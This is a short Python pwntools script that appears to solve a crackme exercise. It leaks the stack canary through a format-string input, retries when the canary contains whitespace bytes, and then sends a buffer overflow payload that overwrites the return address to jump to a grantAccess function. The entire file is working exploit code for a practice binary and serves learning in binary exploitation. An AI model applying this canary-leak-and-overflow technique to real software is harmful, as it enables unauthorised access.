from pwn import *

leak_canary = b'%9$016lx' # Format string to leak the canary
grantAccess_addr = 0x401905
bad_chars = b'\x20\x0a\x09\x0d\x0b\x0c'

while True:
    # Start the crackme
    p = process('./crackme', stdin=PTY, stdout=PTY)

    p.recvuntil(b'Enter Username: ')
    p.sendline(leak_canary) 
    p.recvuntil(b'Enter password for: ')

    canary_hex = p.recv(16) # Read the leaked canary
    canary = int(canary_hex, 16)

    print(f"canary = 0x{canary_hex.decode()}")

    # check if the canary has bad values
    char_bytes = p64(canary)
    if any(char in char_bytes for char in bad_chars):
        print("Leaked canary contains bad characters, retrying...")
        p.close()
        continue


    # Build the payload
    payload = b'A' * 20 # Padding username and password
    payload += p64(canary) # Add the canary to the payload
    payload += b'B' * 8 # Padding to reach the return address
    payload += p64(grantAccess_addr) # Add the address of grantAccess to the payload

    print(f"payload = {payload.hex()}") # Print the payload in hex format

    # Inject the payload
    p.sendline(payload)

    print(p.recv(timeout=1).decode()) # Print the output from the program
    break
